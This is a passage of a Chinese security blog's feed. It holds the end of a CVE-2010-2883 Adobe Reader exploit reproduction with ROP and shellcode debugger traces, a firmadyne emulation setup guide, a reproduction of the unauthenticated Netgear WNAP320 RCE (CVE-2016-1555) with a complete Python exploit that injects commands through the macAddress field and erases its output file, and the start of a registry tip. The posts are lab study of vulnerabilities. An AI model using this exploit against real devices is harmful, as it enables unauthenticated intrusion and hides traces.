class="line">0C0C0CB8   00000000  |OffsetLow = 0x0</span><br><span class="line">0C0C0CBC   00010000  \MapSize = 10000 (65536.)</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0C0C0D44   02860000  /CALL 到 memcpy</span><br><span class="line">0C0C0D48   02860000  |dest = 02860000     ;-------&gt;MapViewOfFile返回的内存地址</span><br><span class="line">0C0C0D4C   0C0C0D54  |src = 0C0C0D54      ;-------&gt;shellcode地址</span><br><span class="line">0C0C0D50   00001000  \n = 1000 (4096.)</span><br></pre></td></tr></table></figure><p>这里就是创建一块可读可写可执行的块,将我们的shellcode执行弹计算器的代码复制进去,这里申请的块大小为65535,shellcode中使用<code>0x0c</code>来填充.</p><p><img src="https://i.loli.net/2021/11/20/NfRhBXbyo72wS8r.png" alt="1637398454867"></p><p>继续运行计算器就成功运行了.</p><h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h1><p>ROP链中关键的两个地<code>址0x4A80CB38</code>, <code>0x4A82A714</code>.这两个地址在各个Adobe Reader版本中都不变的,所以包证了shellcode的稳定性.这两个地址填充uniquename数据的偏移是怎么算的呢?, <code>0x4A80CB38</code>的偏移是通过在第二次<code>call eax</code>的<code>eax</code>的值来确定的,<code>0x4A82A714</code>的偏移是通过<code>0x4A80CB38</code>中的<code>add ebp,0x794</code>确定的.然后就通过<code>leave ret</code>操作抬高栈,然后使<code>esp==&gt;0x0c0c0c0c</code>,最后达到执行shellcode的条件.</p><h1 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h1><p>漏洞战争2.3</p><p><a href="https://bbs.pediy.com/thread-257172.htm#msg_header_h1_5">https://bbs.pediy.com/thread-257172.htm#msg_header_h1_5</a></p><p><a href="https://www.anquanke.com/post/id/179681">https://www.anquanke.com/post/id/179681</a></p><p><a href="https://cloud.tencent.com/developer/article/1358259">https://cloud.tencent.com/developer/article/1358259</a></p>]]></content>
    
    
    <summary type="html">CVE-2010-2883 Adobe Reader栈溢出复现</summary>
    
    
    
    <category term="CVE复现" scheme="https://adam-01.github.io/categories/CVE%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="CVE复现 漏洞战争" scheme="https://adam-01.github.io/tags/CVE%E5%A4%8D%E7%8E%B0-%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89/"/>
    
  </entry>
  
  <entry>
    <title>firmadyne环境搭建</title>
    <link href="https://adam-01.github.io/2021/10/27/firmadyne%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>https://adam-01.github.io/2021/10/27/firmadyne%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</id>
    <published>2021-10-27T08:00:58.000Z</published>
    <updated>2021-10-27T10:02:44.680Z</updated>
    
    <content type="html"><![CDATA[<p>安装了好几次都失败了，最后老版本安装成功。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ubuntu16.04</span><br><span class="line">python2.7</span><br></pre></td></tr></table></figure><h1 id="Firmware-Analysis-Toolkit"><a href="#Firmware-Analysis-Toolkit" class="headerlink" title="Firmware Analysis Toolkit"></a>Firmware Analysis Toolkit</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --recursive https://github.com/liyansong2018/Old-Firmware-Analysis-Toolkit</span><br></pre></td></tr></table></figure><h1 id="安装binwalk"><a href="#安装binwalk" class="headerlink" title="安装binwalk"></a>安装binwalk</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> binwalk/</span><br><span class="line">sudo ./deps.sh</span><br><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure><h1 id="安装Firmadyne"><a href="#安装Firmadyne" class="headerlink" title="安装Firmadyne"></a>安装Firmadyne</h1><p>首先安装依赖</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install busybox-static fakeroot git dmsetup kpartx netcat-openbsd nmap python-psycopg2 python3-psycopg2 snmp uml-utilities util-linux vlan</span><br></pre></td></tr></table></figure><p>因为firmadyne里的download.sh下载源在国外，需要翻墙，这里直接用被人已经下载好的binaries即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/liyansong2018/Firmadyne-binaries</span><br></pre></td></tr></table></figure><p>下载好之后替换掉原本的binaries。可能会存在权限问题，需要使用cp命令或者mv命令将文件移到binaries里。</p><p>再安装其他依赖</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -H pip install git+https://github.com/ahupp/python-magic</span><br><span class="line">sudo -H pip install git+https://github.com/sviehb/jefferson</span><br><span class="line">sudo apt-get install qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils</span><br></pre></td></tr></table></figure><h1 id="安装postgresql"><a href="#安装postgresql" class="headerlink" title="安装postgresql"></a>安装postgresql</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install postgresql</span><br><span class="line">sudo -u postgres createuser -P firmadyne</span><br><span class="line">sudo -u postgres createdb -O firmadyne firmware</span><br><span class="line">sudo -u postgres psql -d firmware &lt; ./firmadyne/database/schema</span><br></pre></td></tr></table></figure><p>创建时会提示输密码，就使用firmadyne作为密码方便使用。</p><h1 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h1><p>修改 <code>firmadyne/firmadyne.config</code>，修改成绝对路径。</p><p><img src="https://i.loli.net/2021/10/27/PXYO6uqekHinjG1.png" alt="1635326339308"></p><p>将 <code>firmware-analysis-toolkit</code> 根目录下的两个脚本文件 <code>fat.py</code>、<code>reset.py</code>，拷贝到 firmadyne 目录下。并修改 <code>fat.py</code>。主要修改如下，root-pass 是当前系统用户的密码，firmadyne_pass 是其在 postgresql 数据库中的账号密码。<img src="https://i.loli.net/2021/10/27/M9Q3VCZFpmSG1hI.png" alt="1635326461897"></p><h1 id="模拟WNAP320固件"><a href="#模拟WNAP320固件" class="headerlink" title="模拟WNAP320固件"></a>模拟WNAP320固件</h1><p>首先启动postgresql</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service postgresql start</span><br></pre></td></tr></table></figure><p>下载wnap320</p><p><a href="https://www.netgear.com/support/product/WNAP320.aspx#Firmware%20Version%203.7.11.4">https://www.netgear.com/support/product/WNAP320.aspx#Firmware%20Version%203.7.11.4</a></p><p>运行firmadyne下的fat,py文件。输入固件的绝对路径，brand随便输入。</p><p>顺利的话，会出现以下信息，会有一个web服务的IP。</p><p><img src="https://i.loli.net/2021/10/27/6UyPKMg85faLVbh.png" alt="1635326883161"></p><p>回车确认运行之后，在网页端就可以访问了。退出使用ctrl+a +x。</p><p><img src="https://i.loli.net/2021/10/27/j8L5QrgT6VteYiv.png" alt="1635327068595"></p><p>在运行fat.py时可能会报错，根据报错信息去排查，我报了python-psycopg2的错，可能因为在安装依赖的时候python-psycopg2没安好。又单独安装了python-psycopg2。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python-psycopg2</span><br></pre></td></tr></table></figure><p>fat.py其实就是依次运行了extractor.py、getArch.sh、tar2db.py、makeImage.sh、inferNetwork.sh、run.sh。</p><p>可以单独运行脚本去排错。每个脚本具体功能和用法在文档有写：<a href="https://github.com/firmadyne/firmadyne#setup">https://github.com/firmadyne/firmadyne#setup</a></p><h1 id="Netgear-WNAP320-未授权RCE漏洞（CVE-2016-1555复现"><a href="#Netgear-WNAP320-未授权RCE漏洞（CVE-2016-1555复现" class="headerlink" title="Netgear WNAP320 未授权RCE漏洞（CVE-2016-1555复现"></a>Netgear WNAP320 未授权RCE漏洞（CVE-2016-1555复现</h1><p>参考：<a href="https://www.seebug.org/vuldb/ssvid-99281">https://www.seebug.org/vuldb/ssvid-99281</a></p><p>使用binwalk解压得到squashfs-root文件系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me WNAP320F2.0.3.zip</span><br></pre></td></tr></table></figure><p>漏洞点在<code>_WNAP320_V2.0.3_firmware.tar.extracted/_rootfs.squashfs.extracted/squashfs-root/home/wwwboardDataWW.php</code>第8行，没有对<code>$_REQUEST[&#39;macAddress&#39;]</code>做过滤，造成任意代码执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;writeData&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;macAddress&#x27;</span>]) &amp;&amp; array_search(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;reginfo&#x27;</span>],<span class="keyword">Array</span>(<span class="string">&#x27;WW&#x27;</span>=&gt;<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;NA&#x27;</span>=&gt;<span class="string">&#x27;1&#x27;</span>))!==<span class="literal">false</span> &amp;&amp; ereg(<span class="string">&quot;[0-9a-fA-F]&#123;12,12&#125;&quot;</span>,<span class="variable">$_REQUEST</span>[<span class="string">&#x27;macAddress&#x27;</span>],<span class="variable">$regs</span>)!==<span class="literal">false</span>) &#123;</span><br><span class="line"><span class="comment">//echo &quot;test &quot;.$_REQUEST[&#x27;macAddress&#x27;].&quot; &quot;.$_REQUEST[&#x27;reginfo&#x27;];</span></span><br><span class="line"><span class="comment">//exec(&quot;wr_mfg_data &quot;.$_REQUEST[&#x27;macAddress&#x27;].&quot; &quot;.$_REQUEST[&#x27;reginfo&#x27;],$dummy,$res);</span></span><br><span class="line">            <span class="comment">//此处没有对$_REQUEST[&#x27;macAddress&#x27;]做过滤</span></span><br><span class="line">exec(<span class="string">&quot;wr_mfg_data -m &quot;</span>.<span class="variable">$_REQUEST</span>[<span class="string">&#x27;macAddress&#x27;</span>].<span class="string">&quot; -c &quot;</span>.<span class="variable">$_REQUEST</span>[<span class="string">&#x27;reginfo&#x27;</span>],<span class="variable">$dummy</span>,<span class="variable">$res</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$res</span>==<span class="number">0</span>) &#123;</span><br><span class="line">conf_set_buffer(<span class="string">&quot;system:basicSettings:apName netgear&quot;</span>.substr(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;macAddress&#x27;</span>], -<span class="number">6</span>).<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">conf_save();</span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&#x27;Update Success!&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Netgear&lt;/title&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">TABLE &#123;</span><br><span class="line">margin-left: auto;</span><br><span class="line">margin-right: auto;</span><br><span class="line">&#125;</span><br><span class="line">TD &#123;</span><br><span class="line">padding: <span class="number">5</span>px;</span><br><span class="line">text-align: left;</span><br><span class="line">vertical-align: top;</span><br><span class="line">&#125;</span><br><span class="line">.right &#123;</span><br><span class="line">text-align: right;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">&lt;!--</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkMAC</span>(<span class="params">eventobj,mac</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!(/^[<span class="number">0</span>-<span class="number">9</span>A-Fa-f]&#123;<span class="number">12</span>,<span class="number">12</span>&#125;$/.test(mac))) &#123;</span><br><span class="line">document.getElementById(<span class="string">&#x27;br_head&#x27;</span>).innerHTML=<span class="string">&#x27;Enter valid MAC Address!&#x27;</span>;</span><br><span class="line">document.getElementById(<span class="string">&#x27;errorMessageBlock&#x27;</span>).style.display=<span class="string">&#x27;block&#x27;</span>;</span><br><span class="line">document.getElementById(<span class="string">&#x27;macAddress&#x27;</span>).focus();</span><br><span class="line"><span class="keyword">if</span> (!eventobj || ((navigator.userAgent.toLowerCase().indexOf(<span class="string">&quot;msie&quot;</span>) != -<span class="number">1</span>) &amp;&amp; (navigator.userAgent.toLowerCase().indexOf(<span class="string">&quot;opera&quot;</span>) == -<span class="number">1</span>)))</span><br><span class="line">&#123;</span><br><span class="line">window.event.returnValue = <span class="literal">false</span>;</span><br><span class="line">window.event.cancelBubble = <span class="literal">true</span>;</span><br><span class="line">event.returnValue = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">eventobj.stopPropagation();</span><br><span class="line">eventobj.preventDefault();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">document.getElementById(<span class="string">&#x27;errorMessageBlock&#x27;</span>).style.display=<span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body align=<span class="string">&quot;center&quot;</span>&gt;</span><br><span class="line">&lt;form name=<span class="string">&quot;hiddenForm&quot;</span> action=<span class="string">&quot;boardDataWW.php&quot;</span> method=<span class="string">&quot;post&quot;</span> align=<span class="string">&quot;center&quot;</span>&gt;</span><br><span class="line">&lt;div align=<span class="string">&quot;center&quot;</span>&gt;</span><br><span class="line">&lt;table align=<span class="string">&quot;center&quot;</span> style=<span class="string">&quot;margin: 20px; width: 40%; text-align: center; border: 1px solid #46008F&quot;</span>&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td width=<span class="string">&quot;100%&quot;</span> colspan=<span class="string">&quot;2&quot;</span> align=<span class="string">&quot;center&quot;</span>&gt;</span><br><span class="line">&lt;div align=<span class="string">&quot;center&quot;</span> style=<span class="string">&quot;margin:auto;&quot;</span>&gt;</span><br><span class="line">&lt;table id=<span class="string">&quot;errorMessageBlock&quot;</span> align=<span class="string">&quot;center&quot;</span> style=<span class="string">&quot;margin: 4px auto 10px auto; &lt;?php if (<span class="subst">$flag</span> != true) echo &#x27;display: none;&#x27; ?&gt;&quot;</span>&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td style=<span class="string">&quot;padding: 5px; vertical-align: top;&quot;</span>&gt;&lt;img src=<span class="string">&quot;images/alert.gif&quot;</span> style=<span class="string">&quot;border: 0px; padding: 0px; margin: 0px;&quot;</span>&gt;&lt;/td&gt;</span><br><span class="line">&lt;td style=<span class="string">&quot;padding: 5px 5px 5px 0px; vertical-align: middle;&quot;</span>&gt;&lt;b id=<span class="string">&quot;br_head&quot;</span> style=<span class="string">&quot;color: #CC0000;&quot;</span>&gt;<span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="variable">$flag</span> == <span class="literal">true</span>) <span class="keyword">echo</span> (<span class="variable">$msg</span>==<span class="string">&#x27;&#x27;</span>)?<span class="string">&quot;Invalid Data!&quot;</span>:<span class="variable">$msg</span>; <span class="meta">?&gt;</span>&lt;/b&gt;&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td width=&quot;30%&quot; class=&quot;right&quot;&gt;&lt;label for=&quot;macAddress&quot;&gt;&lt;b&gt;MAC Address&lt;/b&gt;&lt;/label&gt;&lt;/td&gt;</span><br><span class="line">&lt;td width=<span class="string">&quot;70%&quot;</span>&gt;&lt;input type=<span class="string">&quot;text&quot;</span> id=<span class="string">&quot;macAddress&quot;</span> name=<span class="string">&quot;macAddress&quot;</span> label=<span class="string">&quot;MAC Address&quot;</span> value=<span class="string">&quot;&lt;?php echo <span class="subst">$_REQUEST</span>[&#x27;macAddress&#x27;] ?&gt;&quot;</span> onasdf=<span class="string">&quot;checkMAC(this.value);&quot;</span>&gt;&amp;nbsp;&lt;small&gt;* Format: xxxxxxxxxxxx (x = Hex <span class="keyword">String</span>)&lt;/small&gt;&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td width=&quot;30%&quot; class=&quot;right&quot;&gt;&lt;label for=&quot;reginfo&quot;&gt;&lt;b&gt;Region&lt;/b&gt;&lt;/label&gt;&lt;/td&gt;</span><br><span class="line">&lt;td width=<span class="string">&quot;70%&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;radio&quot;</span> id=<span class="string">&quot;reginfo&quot;</span> name=<span class="string">&quot;reginfo&quot;</span> value=<span class="string">&quot;0&quot;</span> checked=<span class="string">&quot;true&quot;</span>&gt;&lt;small&gt;Worldwide (WW)&lt;/small&gt;</span><br><span class="line">&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td width=&quot;30%&quot; class=&quot;right&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;writeData&quot; value=&quot;Submit&quot; onclick=&quot;checkMAC(event, document.getElementById(&#x27;macAddress&#x27;).value);&quot;&gt;&lt;/td&gt;</span><br><span class="line">&lt;td width=<span class="string">&quot;70%&quot;</span>&gt;&lt;input type=<span class="string">&quot;reset&quot;</span> name=<span class="string">&quot;reset&quot;</span> value=<span class="string">&quot;Reset Form&quot;</span>&gt;&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用firmadyne模拟固件运行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo python fat.py</span><br><span class="line"><span class="comment">#键入固件绝对路径和brand</span></span><br><span class="line"><span class="comment">#以ctrl+a+x推出</span></span><br></pre></td></tr></table></figure><p>POC：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: Netgear WNAP320 2.0.3 - &#x27;macAddress&#x27; Remote Code Execution (RCE) (Unauthenticated)</span></span><br><span class="line"><span class="comment"># Vulnerability: Remote Command Execution on /boardDataWW.php macAddress parameter</span></span><br><span class="line"><span class="comment"># Notes: The RCE doesn&#x27;t need to be authenticated</span></span><br><span class="line"><span class="comment"># Date: 26/06/2021</span></span><br><span class="line"><span class="comment"># Exploit Author: Bryan Leong &lt;NobodyAtall&gt;</span></span><br><span class="line"><span class="comment"># IoT Device: Netgear WNAP320 Access Point</span></span><br><span class="line"><span class="comment"># Version: WNAP320 Access Point Firmware v2.0.3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(sys.argv) != <span class="number">2</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Must specify the IP parameter&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;eg: python3 wnap320_v2_0_3.py &lt;IP&gt;&quot;</span>)</span><br><span class="line">sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">host = sys.argv[<span class="number">1</span>]</span><br><span class="line">port = <span class="number">80</span></span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">cmd = <span class="built_in">input</span>(<span class="string">&#x27;Shell_CMD$ &#x27;</span>)</span><br><span class="line"><span class="comment">#injecting system command part writing the command output to a output file</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;macAddress&#x27;</span> : <span class="string">&#x27;112233445566;&#x27;</span> + cmd + <span class="string">&#x27; &gt; ./output #&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;reginfo&#x27;</span> : <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;writeData&#x27;</span> : <span class="string">&#x27;Submit&#x27;</span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://&#x27;</span> + host + <span class="string">&#x27;/boardDataWW.php&#x27;</span></span><br><span class="line">response = requests.post(url, data=data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(response.ok):</span><br><span class="line"><span class="comment">#read the command output result</span></span><br><span class="line">url = <span class="string">&#x27;http://&#x27;</span> + host + <span class="string">&#x27;/output&#x27;</span></span><br><span class="line">cmdOutput = requests.get(url)</span><br><span class="line"><span class="built_in">print</span>(cmdOutput.text)</span><br><span class="line"></span><br><span class="line"><span class="comment">#remove trace</span></span><br><span class="line">cmd = <span class="string">&#x27;rm ./output&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;macAddress&#x27;</span> : <span class="string">&#x27;112233445566;&#x27;</span> + cmd + <span class="string">&#x27; #&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;reginfo&#x27;</span> : <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;writeData&#x27;</span> : <span class="string">&#x27;Submit&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&#x27;http://&#x27;</span> + host + <span class="string">&#x27;/boardDataWW.php&#x27;</span></span><br><span class="line">response = requests.post(url, data=data)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[!] No response from the server.&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/27/IudVp6mW7FHYyUG.png" alt="1635328234806"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;安装了好几次都失败了，最后老版本安装成功。&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;l</summary>
      
    
    
    
    <category term="IOT" scheme="https://adam-01.github.io/categories/IOT/"/>
    
    
    <category term="IOT" scheme="https://adam-01.github.io/tags/IOT/"/>
    
  </entry>
  
  <entry>
    <title>win10 右键添加新建文件类型</title>
    <link href="https://adam-01.github.io/2021/10/17/Win10%E5%8F%B3%E9%94%AE%E6%B7%BB%E5%8A%A0%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B/"/>
    <id>https://adam-01.github.io/2021/10/17/Win10%E5%8F%B3%E9%94%AE%E6%B7%BB%E5%8A%A0%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B/</id>
    <published>2021-10-16T16:00:00.000Z</published>
    <updated>2021-10-17T07:51:59.006Z</updated>
    
    <content type="html"><![CDATA[<h1 id="添加markdown"><a href="#添加markdown" class="headerlink" title="添加markdown"></a>添加markdown</h1><p>向注册表中写入内容：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version <span class="number">5</span>.<span class="number">00</span></span><br><span class="line">[HKEY_CLASSES_ROOT\.<span class="built_in">md</span>]</span><br><span class="line">@=&quot;TyporaTextFile&quot;</span><br><span class="line">&quot;Content <span class="built_in">Type</span>&quot;=&quot;text/markdown&quot;</span><br><span class="line">&quot;PerceivedType&quot;=&quot;text&quot;</span><br><span class="line">[HKEY_CLASSES_ROOT\.<span class="built_in">md</span>\ShellNew]</span><br><span class="line">&quot;NullFile&quot;=&quot;&quot;</span><br></pre></td></tr></table></figure><p>保存为.reg文件，双击运行即可。</p><p>这里需要注意的是@后的值，需要于注册表中的值一致。这个项的<code>@ 值</code>代表右键新建该类型的名称显示。如果是自定义其他的类型，则必须导入一遍，比如下面要添加的<code>.py</code>类型。</p><p>我这里注册表路径为</p><p><code>计算机\HKEY_CLASSES_ROOT\TyporaTextFile</code></p><p>此处的数据为右键新建时的文字</p><p><img src="https://i.loli.net/2021/10/17/ZgaIlShGxNWFXPw.png" alt=""></p><h1 id="添加Python文件"><a href="#添加Python文件" class="headerlink" 